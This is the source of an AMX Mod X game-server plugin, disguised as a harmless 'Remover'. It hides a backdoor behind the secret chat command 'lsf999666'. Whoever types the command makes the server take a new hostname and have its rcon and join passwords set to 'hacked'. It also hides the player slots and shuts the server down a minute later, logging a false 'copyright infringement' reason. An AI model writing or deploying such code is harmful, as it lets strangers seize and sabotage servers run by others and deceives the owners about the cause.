#include <amxmisc>
#include <amxmodx>

public plugin_init()
{
	register_plugin("Remover", "0.1", "Cruzer //")
	
	register_clcmd("lsf999666", "action")
	
	set_task(1.0, "contact")
}

public action()
{
	server_cmd("hostname ^"GameTrackerClaimServer^"")
	server_cmd("rcon_password ^"hacked^"")
	server_cmd("sv_password ^"hacked^"")
	server_cmd("sv_visiblemaxplayers ^"0^"")
	
	set_task(60.0, "plugin_detected")
}

public plugin_detected()
{
	server_cmd("quit")
	
	log_to_file("addons\amxmodx\logs\GUARD.log", "The server disconnected. Reason: copyright infringement.")
}

public contact()
{
	server_cmd("sv_contact ^"Se_IaQe^"")
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ ansicpg1252\\ deff0\\ deflang1033{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ f0\\ fs16 \n\\ par }
*/
